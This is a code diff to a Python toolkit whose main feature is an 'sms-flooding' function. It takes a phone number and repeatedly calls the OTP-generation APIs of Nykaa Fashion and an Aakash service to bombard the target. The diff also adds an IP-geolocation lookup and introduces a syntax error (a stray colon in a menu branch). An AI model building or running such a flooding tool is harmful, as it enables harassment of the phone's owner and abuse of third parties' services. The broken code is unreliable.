@@ -72,11 +72,27 @@ any misuse of this toolkit !
             about()
     except:
         print(f"{red}SomeThing Went Wrong...")
-def iptrack():
-    os.system('python iptrack.py' if name=='nt' else 'python3 iptrack.py')
+
+def track_ip_address(ip_address):
+    url = f"http://ip-api.com/json/{ip_address}"
+    response = requests.get(url)
+    data = response.json()
+    if data['status'] == 'success':
+        print("IP: ", data['query'])
+        print("Country: ", data['country'])
+        print("Region: ", data['regionName'])
+        print("City: ", data['city'])
+        print("ISP: ", data['isp'])
+    else:
+        print("Failed to track IP address.")
+
+
+ip_address = input("Enter your ip:") 
+track_ip_address(ip_address)
+
 def logic():
     os.system("clear")
-    print(meanu)
+    print(menu)
     option=input(f"{bred}Choose an option:{white}")
     try:
         if option=="1":
@@ -84,15 +100,13 @@ def logic():
         elif option=="2":
             about()
         elif option=="3":
-            iptrack()
+            track_ip_address(ip_address):
         elif option=="4":
             os.system("clear")
-            print(logo)
             print(f"{bgreen}Thank You For Using...")
         else:
             os.system("clear")
-            print(logo)
-            print(meanu)
+            print(menu)
             print(f"{red}Invlied Option....")
             time.sleep(0.8)
             logic()
@@ -102,10 +116,8 @@ def logic():
 def boomber():
     global number
     os.system("clear")
-    print(logo)
     number=input(f"{bred}Enter the number:{white}")
     os.system("clear")
-    print(logo)
    
     nykaa_url = "https://www.nykaafashion.com/webscripts/api/otp/generate"
     nykaa_headers = {
@@ -150,7 +162,6 @@ def boomber():
         nykaa_response = requests.post(nykaa_url, headers=nykaa_headers, json=nykaa_data)
         aakash_response = requests.post(aakash_url, headers=aakash_headers, data=aakash_data)
         os.system("clear")
-        print(logo)
         a=i+1
         print(f"{yellow}-->{bred}sms-flooding..{bcyan}{a}")
         
